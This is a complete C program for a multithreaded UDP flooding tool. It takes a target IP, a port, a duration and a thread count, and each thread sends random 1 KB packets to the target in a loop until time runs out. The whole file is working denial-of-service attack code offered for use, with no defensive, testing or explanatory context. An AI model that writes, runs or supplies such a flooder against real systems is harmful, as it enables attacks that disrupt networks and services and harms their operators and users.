#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <arpa/inet.h>
#include <time.h>
#include <signal.h>

typedef struct {
    char target_ip[16];
    int target_port;
} flood_args;

volatile int keep_running = 1;

void handle_interrupt(int signal) {
    keep_running = 0;
}

// Function to generate a random byte buffer
void random_buffer(char *buffer, size_t length) {
    for (size_t i = 0; i < length; ++i) {
        buffer[i] = rand() & 0xFF; // Generate random byte
    }
}

// Function to perform network flooding
void *flood(void *arg) {
    flood_args *args = (flood_args *)arg;
    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock < 0) {
        perror("socket");
        pthread_exit(NULL);
    }

    struct sockaddr_in target;
    target.sin_family = AF_INET;
    target.sin_port = htons(args->target_port);
    target.sin_addr.s_addr = inet_addr(args->target_ip);

    char buffer[1024];
    random_buffer(buffer, sizeof(buffer));

    // Set the buffer size for the socket
    int bufsize = 1048576; // 1 MB
    if (setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &bufsize, sizeof(bufsize)) < 0) {
        perror("setsockopt");
        close(sock);
        pthread_exit(NULL);
    }

    while (keep_running) {
        ssize_t sent_bytes = sendto(sock, buffer, sizeof(buffer), 0, (struct sockaddr *)&target, sizeof(target));
        if (sent_bytes < 0) {
            perror("sendto");
            break;
        }
        // Optionally adjust sleep time to control flood rate
        usleep(500); // Sleep for 0.5ms
    }

    close(sock);
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    if (argc != 5) {
        fprintf(stderr, "Usage: %s <Target IP> <Port> <Duration(s)> <Threads>\n", argv[0]);
        exit(EXIT_FAILURE);
    }

    signal(SIGINT, handle_interrupt);
    signal(SIGTERM, handle_interrupt);

    char *target_ip = argv[1];
    int port = atoi(argv[2]);
    int duration = atoi(argv[3]);
    int threads = atoi(argv[4]);

    srand(time(NULL));

    pthread_t *thread_ids = malloc(threads * sizeof(pthread_t));
    if (!thread_ids) {
        perror("malloc");
        exit(EXIT_FAILURE);
    }

    flood_args args;
    strncpy(args.target_ip, target_ip, sizeof(args.target_ip) - 1);
    args.target_ip[sizeof(args.target_ip) - 1] = '\0';
    args.target_port = port;

    for (int i = 0; i < threads; ++i) {
        if (pthread_create(&thread_ids[i], NULL, flood, &args) != 0) {
            perror("pthread_create");
            exit(EXIT_FAILURE);
        }
    }

    sleep(duration);
    keep_running = 0;

    for (int i = 0; i < threads; ++i) {
        pthread_join(thread_ids[i], NULL);
    }

    free(thread_ids);
    printf("Flooding complete.\n");
    return 0;
}
